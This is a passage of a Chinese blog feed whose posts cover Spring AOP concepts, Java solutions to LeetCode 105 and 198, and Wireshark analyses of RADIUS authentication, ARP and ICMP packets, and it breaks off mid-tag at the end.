    <content type="html"><![CDATA[<p>AOP即面向切编程，利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各个部分耦合度降低，提高程序的可重用性，提高开发效率</p><p>将日志记录、性能统计、安全控制、事务处理、异常处理从业务逻辑划分划分处理</p><p>这个可以体现软件设计的<strong>开闭原则</strong>（软件中的对象（类，模块，函数等等）应该对于扩展是开放的，但是对于修改是封闭的”[<a href="https://zh.wikipedia.org/wiki/%E5%BC%80%E9%97%AD%E5%8E%9F%E5%88%99#cite_note-1">1]</a>，这意味着一个实体是允许在不改变它的<a href="https://zh.wikipedia.org/wiki/%E6%BA%90%E4%BB%A3%E7%A0%81">源代码</a>的前提下变更它的行为。）即不修改源代码方式添加新的功能</p><h3 id="AOP底层原理"><a href="#AOP底层原理" class="headerlink" title="AOP底层原理"></a>AOP底层原理</h3><ol><li>AOP底层使用动态代理</li></ol><p>第一种 ：有接口的情况</p><img src="/2022/03/19/Spring/SpringAOP/image-20220319230831202.png" class><p>创建接口实现类的方式实现代理对象</p><ol start="2"><li>没有接口的情况</li></ol><img src="/2022/03/19/Spring/SpringAOP/image-20220319231306571.png" class><p>创建当前类子类的代理对象</p><h4 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h4><ol><li>连接点</li></ol><p>类里有哪些方法可以被增强，这些方法就称为连接点</p><ol start="2"><li>切入点</li></ol><p>实际被增强的方法</p><ol start="3"><li>通知（增强）</li></ol><p>实际增强的逻辑部分被称为通知</p><ul><li>前置通知</li></ul><p>方法执行之前通知</p><ul><li>后置通知</li></ul><p>方法执行之后通知</p><ul><li>环绕通知</li></ul><p>执行前后头通知</p><ul><li>异常通知</li></ul><p>方法执行异常会通知</p><ul><li>最终通知</li></ul><p>不管有没有异常都会执行，相当于finally</p><ol start="4"><li>切面</li></ol><p>是动作，把通知应用到切入点的过程称为切面</p><p>spring基于aspectJ 实现AOP操作</p><img src="/2022/03/19/Spring/SpringAOP/image-20220319232745557.png" class><img src="/2022/03/19/Spring/SpringAOP/image-20220319233036476.png" class><img src="/2022/03/19/Spring/SpringAOP/image-20220319233155028.png" class><img src="/2022/03/19/Spring/SpringAOP/image-20220319233338050.png" class><img src="/2022/03/19/Spring/SpringAOP/image-20220319233409784.png" class><p>至此关于spring的使用过程已经讲解结束，其实我很早之前就使用过AOP，这里只是挑了自己感兴趣的地方看了看，如果浪费了大家的时间，希望大家理解</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;AOP即面向切编程，利用AOP可以对业务逻辑的各个部分进行隔离，从而使得业务逻辑各个部分耦合度降低，提高程序的可重用性，提高开发效率&lt;/p&gt;
&lt;p&gt;将日志记录、性能统计、安全控制、事务处理、异常处理从业务逻辑划分划分处理&lt;/p&gt;
&lt;p&gt;这个可以体现软件设计的&lt;strong&gt;</summary>
      
    
    
    
    <category term="Spring" scheme="http://example.com/categories/Spring/"/>
    
    
    <category term="Spring" scheme="http://example.com/tags/Spring/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode105从前序与中序遍历序列构造二叉树</title>
    <link href="http://example.com/2022/03/17/Algo/LeetCode105%E4%BB%8E%E5%89%8D%E5%BA%8F%E4%B8%8E%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <id>http://example.com/2022/03/17/Algo/LeetCode105%E4%BB%8E%E5%89%8D%E5%BA%8F%E4%B8%8E%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91/</id>
    <published>2022-03-17T15:13:44.000Z</published>
    <updated>2022-03-17T15:37:21.710Z</updated>
    
    <content type="html"><![CDATA[<p>今天分享一道mid的二叉树题目：<a href="https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal/">从前序与中序遍历序列构造二叉树</a>，每次遇到二叉树题目的时候，一定一定一定要先想想递归的思想</p><p>什么是递归的思想，递归一般要考虑如何去分解问题，如何把分解的问题结果进行合并，由于我们只讲本道题目，所以递归的思想我就不过多赘述。</p><p>说实话，这道题目一直是我的梦魇，我看过这道题很多遍了，每次都手足无措，可能是因为我的心里就不想去做它，今天看了题解，可算是明白这道题怎么解了。不多说了，我们之间进入题解</p><p>前序遍历的结果是: [1,2,4,5,3,6,7]<br>中序遍历的结果是: [4,2,5,1,6,3,7]<br>前序遍历的特点是， 根节点 始终出现在数组的第一位，而中序遍历中 根节点 出现在数组的中间位置，这里的中间不是绝对中间，而是相对中间。</p><p>根据上面给出的两个数组，首先我们就可以拼出 <code>根节点</code>，它就是 <code>1</code>。在中序遍历数组里面，1的左侧就是左子树全部节点，1的右侧就是右子树的全部节点。</p><img src="/2022/03/17/Algo/LeetCode105%E4%BB%8E%E5%89%8D%E5%BA%8F%E4%B8%8E%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220317232050939.png" class><p>如图，还有值得一提的是：两个数组的长度一定一定是相等的。</p><p>这道题是一个典型的<strong>分治</strong>算法</p><p>所以我们现在就去new一个节点，它的值为1，那它的左子树和右子树是什么呢？这就交给它的两个小弟吧（递归思想）。那现在问题应该如何去分解呢？</p><p>我们把两个数组分为以下四部分</p><img src="/2022/03/17/Algo/LeetCode105%E4%BB%8E%E5%89%8D%E5%BA%8F%E4%B8%8E%E4%B8%AD%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91/image-20220317232743037.png" class><p>in_left为中序遍历的左侧全部节点，in_right为中序遍历右侧全部节点</p><p>pre_left为前序遍历的左侧全部节点，pre_right为前序遍历右侧全部节点</p><p>然后我们现在当前树的根节点就是pre_order的第一个节点，它的左子树就交给buildTree(pre_left, in_left);右子树就交给buildTree(pre_right, in_right);</p><p>最后返回根节点就可以了</p><figure class="highlight java"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Definition for a binary tree node.</span><br><span class="hljs-comment"> * public class TreeNode &#123;</span><br><span class="hljs-comment"> *     int val;</span><br><span class="hljs-comment"> *     TreeNode left;</span><br><span class="hljs-comment"> *     TreeNode right;</span><br><span class="hljs-comment"> *     TreeNode() &#123;&#125;</span><br><span class="hljs-comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span><br><span class="hljs-comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span><br><span class="hljs-comment"> *         this.val = val;</span><br><span class="hljs-comment"> *         this.left = left;</span><br><span class="hljs-comment"> *         this.right = right;</span><br><span class="hljs-comment"> *     &#125;</span><br><span class="hljs-comment"> * &#125;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> TreeNode <span class="hljs-title function_">buildTree</span><span class="hljs-params">(<span class="hljs-type">int</span>[] preorder, <span class="hljs-type">int</span>[] inorder)</span> &#123;<br>        <span class="hljs-comment">// 这里两个数组应该是等长的</span><br>        <span class="hljs-keyword">if</span> (preorder.length == <span class="hljs-number">0</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">TreeNode</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TreeNode</span>(preorder[<span class="hljs-number">0</span>]);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; inorder.length; i++) &#123;<br>            <span class="hljs-keyword">if</span> (inorder[i] == preorder[<span class="hljs-number">0</span>]) &#123;<br>                <span class="hljs-type">int</span>[] pre_left = Arrays.copyOfRange(preorder, <span class="hljs-number">1</span>, i+<span class="hljs-number">1</span>);<br>                <span class="hljs-type">int</span>[] pre_right = Arrays.copyOfRange(preorder, i+<span class="hljs-number">1</span>, preorder.length);<br>                <span class="hljs-type">int</span>[] in_left = Arrays.copyOfRange(inorder, <span class="hljs-number">0</span>, i);<br>                <span class="hljs-type">int</span>[] in_right = Arrays.copyOfRange(inorder, i+<span class="hljs-number">1</span>, inorder.length);<br>                node.left = buildTree(pre_left, in_left);<br>                node.right = buildTree(pre_right, in_right);<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> node;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后附上完整的程序，值得一提的是Arrays.copyOfRange（arr, start, end）在复制数组的时候是[start : end)，也就是前闭后开的结果</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天分享一道mid的二叉树题目：&lt;a href=&quot;https://leetcode-cn.com/problems/construct-binary-tree-from-preorder-and-inorder-traversal/&quot;&gt;从前序与中序遍历序列构造二叉树&lt;/a&gt;</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://example.com/categories/Algorithm/"/>
    
    
    <category term="Algorithm" scheme="http://example.com/tags/Algorithm/"/>
    
    <category term="二叉树" scheme="http://example.com/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    
    <category term="分治" scheme="http://example.com/tags/%E5%88%86%E6%B2%BB/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode198打家劫舍</title>
    <link href="http://example.com/2022/03/17/Algo/LeetCode198%E6%89%93%E5%AE%B6%E5%8A%AB%E8%88%8D/"/>
    <id>http://example.com/2022/03/17/Algo/LeetCode198%E6%89%93%E5%AE%B6%E5%8A%AB%E8%88%8D/</id>
    <published>2022-03-17T14:04:55.000Z</published>
    <updated>2022-03-17T15:53:35.079Z</updated>
    
    <content type="html"><![CDATA[<p>今天来分享一道简单的动态规划题目：<a href="https://leetcode-cn.com/problems/house-robber/">打家劫舍</a></p><p>动态规划有两大注意点：</p><ol><li>一个原问题是建立在子问题的基础之上，所以找出两者关系至关重要</li><li>用空间换时间，把子问题的答案用一个空间记录下来，在这样子原问题就不需要重复计算了</li></ol><p>对于这个问题我们假设：dp[i] 代表前 i 个房子在满足条件下的能偷窃到的最高金额。我们现在的目的是想找到的dp[n]最大，那让我们现在想想dp[n+1]与dp[n]的关系。</p><p>假设第 n 间没有被偷，那么此时 dp[n]&#x3D;dp[n−1] ，此时 dp[n+1] &#x3D; dp[n] + num &#x3D; dp[n-1] + num ，即两种情况可以 合并为一种情况 考虑；<br>假设第 n 间被偷，那么此时 dp[n+1]&#x3D;dp[n]+num 不可取 ，因为偷了第 n 间就不能偷第 n+1 间。</p><p>得到转移方程 dp[n+1] &#x3D; max(dp[n],dp[n-1]+num)</p><p>所以我们只需要用两个值分别记录dp[n-1]和dp[n]就可以了。</p><figure class="highlight java"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">rob</span><span class="hljs-params">(<span class="hljs-type">int</span>[] nums)</span> &#123;<br>        <span class="hljs-comment">// 注意这里pre为dp[n-1], cur为dp[n];</span><br>        <span class="hljs-type">int</span> <span class="hljs-variable">pre</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>, cur = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; nums.length; i++) &#123;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">temp</span> <span class="hljs-operator">=</span> cur;<br>            cur = Math.max(pre + nums[i], cur);<br>            pre = temp;<br>        &#125;<br>        <span class="hljs-keyword">return</span> cur;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后可以看到其实解题过程十分简单，并不是所有的动态规划都需要去创建一个与原数组等长的数组</p><p>同时我们也可以得出来：要分析子问题和原问题的关系尤为重要</p><p>在这里多插一句：我们常认为动态规划和贪心算法有某种关联，其实贪心算法就像是一种特殊的动态规划算法，因为当可以贪心的时候，它一定被证明过有某种东西可贪，所以如果想使用贪心算法，那证明过程一定十分重要</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天来分享一道简单的动态规划题目：&lt;a href=&quot;https://leetcode-cn.com/problems/house-robber/&quot;&gt;打家劫舍&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;动态规划有两大注意点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;一个原问题是建立在子问题的基础之上，所以找出</summary>
      
    
    
    
    <category term="Algorithm" scheme="http://example.com/categories/Algorithm/"/>
    
    
    <category term="Algorithm" scheme="http://example.com/tags/Algorithm/"/>
    
    <category term="动态规划" scheme="http://example.com/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>关于radius的认证过程分析</title>
    <link href="http://example.com/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%85%B3%E4%BA%8Eradius%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%85%B3%E4%BA%8Eradius%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/</id>
    <published>2022-03-16T12:11:57.000Z</published>
    <updated>2022-03-16T15:20:11.481Z</updated>
    
    <content type="html"><![CDATA[<h2 id="预讲"><a href="#预讲" class="headerlink" title="预讲"></a>预讲</h2><p>在了解认证过程之前先了解一些基础的东西</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%85%B3%E4%BA%8Eradius%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/image-20220316201426576.png" class><p>如图radius服务有三个部分</p><ul><li>Users：用于存储用户信息（如用户名、密码以及使用的协议、IP地址等配置信息）。</li><li>Clients：用于存储RADIUS客户端的信息（如共享密钥、IP地址等）。</li><li>Dictionary：用于存储RADIUS协议中的属性和属性值含义的信息。</li></ul><p>认证过程如图：</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%85%B3%E4%BA%8Eradius%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/image-20220316201529044.png" class><ol><li>当用户接入网络时，用户发起连接请求，向RADIUS客户端（即设备）发送用户名和密码。</li><li>RADIUS客户端向RADIUS服务器发送包含用户名和密码信息的认证请求报文。</li><li>RADIUS服务器对用户身份的合法性进行检验：<ul><li>如果用户身份合法，RADIUS服务器向RADIUS客户端返回认证接受报文，允许用户进行下一步动作。由于RADIUS协议合并了认证和授权的过程，因此认证接受报文中也包含了用户的授权信息。</li><li>如果用户身份不合法，RADIUS服务器向RADIUS客户端返回认证拒绝报文，拒绝用户访问接入网络。</li></ul></li><li>RADIUS客户端通知用户认证是否成功。</li><li>RADIUS客户端根据接收到的认证结果接入&#x2F;拒绝用户。如果允许用户接入，则RADIUS客户端向RADIUS服务器发送计费开始请求报文。</li><li>RADIUS服务器返回计费开始响应报文，并开始计费。</li><li>用户开始访问网络资源。</li><li>（可选）在使能实时计费功能的情况下，RADIUS客户端会定时向RADIUS服务器发送实时计费请求报文，以避免因付费用户异常下线导致的不合理计费。</li><li>（可选）RADIUS服务器返回实时计费响应报文，并实时计费。</li><li>用户发起下线请求，请求停止访问网络资源。</li><li>RADIUS客户端向RADIUS服务器提交计费结束请求报文。</li><li>RADIUS服务器返回计费结束响应报文，并停止计费。</li><li>RADIUS客户端通知用户访问结束，用户结束访问网络资源。</li></ol><h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>下面开始分析过程:</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%85%B3%E4%BA%8Eradius%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/image-20220316201718841.png" class><p>上的抓包time 为相对时间，source 为源IP，destination 为目的IP protocol为数据包所对应的协议类型，info为包的大概行为 </p><p>如图为分析过程，下面需要先去定位三个东西：users-&gt;IP &#x2F; radius server-&gt;IP &#x2F; radius clients-&gt;IP</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%85%B3%E4%BA%8Eradius%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/image-20220316204705680.png" class><p>首先看第60个包这是一个access-reqest, 应该是用户请求上网数据包，我们先来看看包内容</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%85%B3%E4%BA%8Eradius%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/image-20220316204837737.png" class><p>里面包括用户名、密码等内容，大概可以确定userIP—61.174.80.81,client—-172.21.5.2，server—-172.30.5.255</p><p>ip.addr &#x3D;&#x3D; 61.174.80.81 </p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%85%B3%E4%BA%8Eradius%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/image-20220316230353885.png" class><p>对IP过滤以后发现这个用户的请求被拒绝过，<strong>拒绝的具体过程应该在No.60~329</strong>之间</p><p>接下来继续过滤</p><p>(ip.dst &#x3D;&#x3D; 172.21.5.2 &amp;&amp; ip.src &#x3D;&#x3D; 172.30.5.225) || (ip.dst &#x3D;&#x3D; 172.30.5.225 &amp;&amp; ip.src &#x3D;&#x3D; 172.21.5.2)</p><p>我把包限制为只能在client和server之间传输</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%85%B3%E4%BA%8Eradius%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/image-20220316230522064.png" class><p>接下来继续看，刚才的那个用户61.174.80.81</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%85%B3%E4%BA%8Eradius%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/image-20220316214832327.png" class><p>可以看到他和client除了access类型还有accounting-request类型，accounting这应该是计费数据包，其中每个包都会有回复</p><p>接下来对流进行追踪</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%85%B3%E4%BA%8Eradius%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/image-20220316231040036.png" class><p>我不知道为什么这个用户的验证会如此频繁，按道理只有登录请求一次就可以了，但是这个access-request却异常多，可能是在用户上网过程中，这个还在不断验证</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%85%B3%E4%BA%8Eradius%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/image-20220316222552133.png" class><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%85%B3%E4%BA%8Eradius%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/image-20220316231505350.png" class><p>除了 access-request还有account-request，这应该是计费请求，计费请求通常回复非常快，中间很少插有其他用户的包。</p><p>接下来对于包的内容进行分析</p><h2 id="包分析"><a href="#包分析" class="headerlink" title="包分析"></a>包分析</h2><p>一下均为让radius数据包，因为ICMP或TCP包数量极少且我在上一篇文章就有讲解过</p><h3 id="access-request"><a href="#access-request" class="headerlink" title="access-request"></a>access-request</h3><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%85%B3%E4%BA%8Eradius%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/image-20220316215313010.png" class><p>请求的内容还是比较多的，有用户名、CHAP(挑战握手协议)密码.NAS(<strong>网络附属存储</strong>)</p><p>端口、IP。服务类型。我觉得最重要的应该是acct-session-Id。用户session已经被存储在服务端了。</p><h3 id="access-reject"><a href="#access-reject" class="headerlink" title="access-reject"></a>access-reject</h3><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%85%B3%E4%BA%8Eradius%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/image-20220316215749901.png" class><p>应该是拒绝策略</p><p>包括用户名、发送的类型，6应该表示拒绝，回复信息、身份信息验证信息</p><h3 id="access-accept"><a href="#access-accept" class="headerlink" title="access-accept"></a>access-accept</h3><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%85%B3%E4%BA%8Eradius%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/image-20220316220117502.png" class><p>可以看到一旦认证成功返回的信息还是比较多的。</p><p>返回信息包括用户名，服务类型（应该是校园网套餐类型），成帧协议，session过期时间，用户临时间隔下面还有一些设备型号，应该是设备供应商</p><h3 id="accounting-request"><a href="#accounting-request" class="headerlink" title="accounting-request"></a>accounting-request</h3><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%85%B3%E4%BA%8Eradius%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/image-20220316220936712.png" class><p>可以看到内容还是比较多的，就讲讲Acct开头的吧，主要就是一些用户状态，延迟时间、输出输出八进制数、session id、session有效时间端口等待，和上面还是比较相似的。</p><h3 id="accounting-response"><a href="#accounting-response" class="headerlink" title="accounting-response"></a>accounting-response</h3><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%85%B3%E4%BA%8Eradius%E7%9A%84%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E5%88%86%E6%9E%90/image-20220316223042147.png" class><p>这个回复的数据包信息还是比较少的，只有用户session-id和代理状态</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;预讲&quot;&gt;&lt;a href=&quot;#预讲&quot; class=&quot;headerlink&quot; title=&quot;预讲&quot;&gt;&lt;/a&gt;预讲&lt;/h2&gt;&lt;p&gt;在了解认证过程之前先了解一些基础的东西&lt;/p&gt;
&lt;img src=&quot;/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C</summary>
      
    
    
    
    <category term="计算机网络" scheme="http://example.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="计算机网络" scheme="http://example.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    <category term="抓包" scheme="http://example.com/tags/%E6%8A%93%E5%8C%85/"/>
    
  </entry>
  
  <entry>
    <title>Wireshark抓包分析</title>
    <link href="http://example.com/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/"/>
    <id>http://example.com/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/</id>
    <published>2022-03-16T08:55:52.000Z</published>
    <updated>2022-03-17T01:21:13.605Z</updated>
    
    <content type="html"><![CDATA[<p>上篇文章我们讲了如何用wireshark抓包并且进行过滤，但是抓到包不会看这是没有用的，这节课我们讲如何对不同种类的包进行分析。</p><p>下面我将对不同种类的包进行讲解</p><h2 id="ARP"><a href="#ARP" class="headerlink" title="ARP"></a>ARP</h2><p>我们知道，arp协议工作于数据链路层，是为了完成IP地址与mac地址的转化，即根据IP地址来找到mac地址</p><p>可以看到我筛选了arp种类的包</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316164021419.png" class><p>Source为发送源，Info为具体的这个包功能的介绍，翻译为：谁有xxxip,我是xxxIP</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316170122119.png" class><p>这是包的具体内容，我们依次展开进行讲解</p><h3 id="Frame"><a href="#Frame" class="headerlink" title="Frame"></a>Frame</h3><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316170208880.png" class><h3 id="Linux-cooked"><a href="#Linux-cooked" class="headerlink" title="Linux cooked"></a>Linux cooked</h3><p>这里记载了包的发送或接收时间、包的id号、种类等等</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316170504076.png" class><p>这里记载了包的源地址的网络类型（address type），这里是指以太网、源地址长度(adress length)、源（source）</p><h3 id="Address"><a href="#Address" class="headerlink" title="Address"></a>Address</h3><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316171056031.png" class><p>hardware type : 网络类型，这里指以太网</p><p>protocol type : 表示arp包所映射地址的协议类型，这里是IP v4</p><p>opcode：包的类型，这是一个请求报文</p><p>send mac Adress: 发送方的mac地址，</p><p>send ip Adress: 发送方IP</p><p>target mac Adress: 接收方mac地址，这里还不知道，所以全部为0</p><p>target IP adress: 接收方IP地址</p><p>下面我们找一个回复报文的例子</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316172158040.png" class><p>可以看到，其实基本一致，就是内容略有不同</p><h2 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h2><p>ICMP工作于网络层，它负责传递一些错误消息的报文和一些需要传递的东西，比如说：哥们儿，包丢了xxx。我们常见的ping命令。就是icmp报文。</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316172534725.png" class><p>接下来我们筛选一批ICMP包</p><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316173129471.png" class><h4 id="Internet-Portocol"><a href="#Internet-Portocol" class="headerlink" title="Internet Portocol"></a>Internet Portocol</h4><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316173509875.png" class><p>这里和arp基本相似，就是一些源IP，目的IP之类的。</p><h3 id="Internet-Control"><a href="#Internet-Control" class="headerlink" title="Internet Control"></a>Internet Control</h3><img src="/2022/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/Wireshark%E6%8A%93%E5%8C%85%E5%88%86%E6%9E%90/image-20220316173804613.png" class><p>这里就是一些校验码之类的</p><h4 id="User-Datagram"><a href="#User-Datagram" class="headerlink" title="User 